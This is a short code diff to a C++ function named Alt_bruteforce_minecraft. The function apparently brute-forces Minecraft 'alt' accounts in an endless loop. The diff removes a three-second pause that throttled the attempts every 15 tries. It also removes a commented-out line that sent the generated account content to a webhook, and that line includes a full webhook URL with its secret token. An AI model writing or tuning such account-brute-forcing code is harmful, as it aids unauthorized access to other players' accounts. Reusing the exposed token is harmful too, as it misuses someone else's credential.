@@ -21,8 +21,6 @@ void Alt_bruteforce_minecraft()
 
     while (1) {
 
-        if (count % 15 == 0) Sleep(3000);
-
         int k = 0;
         
         for (int i = 0; i < 20; i++) {
@@ -42,10 +40,7 @@ void Alt_bruteforce_minecraft()
         Alt_content = "`" + Alt_content + "`";
 
         
-        
-
-
-        //Send_webhook(L"/api/webhooks/1197086126394069105/JDaoVFVmLxF1N6SX012iu5MQdiIwzKvEFswaOoKJnLjc3e8tNjy76K1e-2agz4RV32oP", "Minecraft Alt Generator",Alt_content);
+    
 
 
         int i = 0;
